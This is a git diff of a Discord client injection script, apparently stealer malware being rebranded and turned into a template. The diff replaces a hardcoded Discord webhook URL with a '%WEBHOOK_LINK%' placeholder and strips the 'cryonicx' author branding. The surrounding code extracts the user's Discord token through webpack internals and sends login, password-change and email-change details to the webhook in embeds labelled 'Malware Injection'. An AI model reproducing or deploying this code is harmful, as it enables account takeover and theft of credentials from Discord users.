@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "https://canary.discord.com/api/webhooks/934773340038631445/xfNeyDoAFLw5ddpPKLlEliSbO0gKGHSj4yWs6Siz3OGtIwD4mEwAHL_sMOxnPfAghKoE";
+var webhook = "%WEBHOOK_LINK%";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -71,7 +71,7 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "cryonicx",
+						username: "",
 						content: "",
 						embeds: [{
 							title: "Discord Initalized (User not Logged in)",
@@ -82,10 +82,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "cryonicx"
+								name: ""
 							},
 							footer: {
-								text: "cryonicx"
+								text: ""
 							}
 						}]
 					};
@@ -97,11 +97,11 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "cryonicx",
+							username: "",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+								description: "[**<:bughunter_2:874750808430874664> │  Discord**](https://discord.gg/tXDrKqhDZf)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -125,10 +125,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "cryonicx"
+									name: ""
 								},
 								footer: {
-									text: "cryonicx"
+									text: ""
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -141,7 +141,7 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "cryonicx"))) {
+		if (!fs.existsSync(path.join(__dirname, ""))) {
 			return !0
 		}
 		fs.rmdirSync(path.join(__dirname, "cryonicx"));
@@ -179,7 +179,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+								description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -457,7 +457,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -624,7 +624,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
@@ -815,7 +815,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -987,7 +987,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
@@ -1182,7 +1182,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -1351,7 +1351,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/tXDrKqhDZf)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
